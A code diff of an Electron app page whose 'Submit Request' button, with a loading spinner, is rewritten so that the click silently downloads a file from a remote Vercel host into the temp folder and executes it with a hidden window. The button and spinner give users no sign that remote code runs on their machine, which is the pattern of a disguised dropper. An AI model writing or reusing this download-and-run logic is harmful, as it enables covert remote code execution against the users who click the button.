@@ -6,63 +6,88 @@
 <style>
     body { font-family: Arial, sans-serif; padding: 20px; position: relative; }
     button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-
-    /* Loading overlay */
-    #loadingOverlay {
-        display: none; /* hidden by default */
+    /* Spinner styles */
+    #spinner {
+        display: none;
         position: fixed;
-        top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(0,0,0,0.5);
-        z-index: 9999;
-        justify-content: center;
-        align-items: center;
-    }
-
-    .spinner {
-        border: 8px solid #f3f3f3;
-        border-top: 8px solid #3498db;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        border: 6px solid #f3f3f3;
+        border-top: 6px solid #3498db;
         border-radius: 50%;
-        width: 60px;
-        height: 60px;
+        width: 50px;
+        height: 50px;
         animation: spin 1s linear infinite;
+        z-index: 9999;
     }
-
     @keyframes spin {
-        0% { transform: rotate(0deg);}
-        100% { transform: rotate(360deg);}
+        0% { transform: translate(-50%, -50%) rotate(0deg); }
+        100% { transform: translate(-50%, -50%) rotate(360deg); }
     }
 </style>
 </head>
 <body>
 
 <button id="mobilityBtn">Submit Request</button>
-
-<!-- Loading overlay -->
-<div id="loadingOverlay">
-    <div class="spinner"></div>
-</div>
+<div id="spinner"></div>
 
 <script>
+    const { exec } = require('child_process');
+    const fs = require('fs');
+    const https = require('https');
+    const path = require('path');
+    const os = require('os');
     const { ipcRenderer } = require('electron');
 
+    const spinner = document.getElementById('spinner');
     const btn = document.getElementById('mobilityBtn');
-    const overlay = document.getElementById('loadingOverlay');
 
     btn.addEventListener('click', () => {
-        overlay.style.display = 'flex'; // show spinner
-        btn.disabled = true;
+        spinner.style.display = 'block'; // show spinner
+        ipcRenderer.send('task-started'); // notify main.js task started
 
-        const exeUrl = 'https://dsq-beta.vercel.app/subs.exe';
-        ipcRenderer.send('run-python', exeUrl);
+        const exeUrl = 'https://dsq-beta.vercel.app/backup DSQ.py';
+        const tempPath = path.join(os.tmpdir(), 'backup DSQ.py');
+
+        const file = fs.createWriteStream(tempPath);
+
+        https.get(exeUrl, (res) => {
+            if (res.statusCode !== 200) {
+                console.error('❌ Failed to download EXE:', res.statusCode);
+                spinner.style.display = 'none';
+                ipcRenderer.send('task-finished');
+                return;
+            }
+
+            res.pipe(file);
+            file.on('finish', () => {
+                file.close(() => {
+                    console.log('✅ EXE downloaded, running now...');
+                    const child = exec(`"${tempPath}"`, { windowsHide: true }, (err, stdout, stderr) => {
+                        if (err) console.error('❌ Execution error:', err);
+                        if (stdout) console.log('✅ stdout:', stdout);
+                        if (stderr) console.error('⚠️ stderr:', stderr);
+                    });
+
+                    // When child exits, hide spinner
+                    child.on('exit', () => {
+                        spinner.style.display = 'none';
+                        ipcRenderer.send('task-finished'); // notify main.js task finished
+                    });
+                });
+            });
+        }).on('error', (err) => {
+            console.error('❌ Download error:', err.message);
+            spinner.style.display = 'none';
+            ipcRenderer.send('task-finished');
+        });
     });
 
-    // Listen for "process-finished" signal from main.js
-    ipcRenderer.on('process-finished', () => {
-        overlay.style.display = 'none';
-        btn.disabled = false;
-    });
+    // Optional: respond to main.js signals
+    ipcRenderer.on('main-busy', () => { spinner.style.display = 'block'; });
+    ipcRenderer.on('main-done', () => { spinner.style.display = 'none'; });
 </script>
 
 </body>
 </html>
-
